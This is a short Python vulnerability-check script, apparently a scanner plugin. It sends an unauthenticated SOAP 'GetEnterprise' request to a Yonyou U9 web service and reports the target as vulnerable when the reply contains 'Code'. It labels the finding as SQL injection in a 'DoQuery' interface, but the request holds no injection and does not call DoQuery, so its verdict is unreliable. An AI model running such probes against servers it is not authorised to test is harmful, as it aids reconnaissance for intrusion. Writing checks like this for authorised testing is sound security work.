import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友U9系统DoQuery接口存在SQL注入',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Content-Type': 'text/xml; charset=utf-8',
        'SOAPAction': '"http://tempuri.org/GetEnterprise"'
    }
    data = '''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <GetEnterprise xmlns="http://tempuri.org/" />
      </soap:Body>
    </soap:Envelope>'''
    vurl = urllib.parse.urljoin(url, "/U9C/CS/Office/TransWebService.asmx")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'Code' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult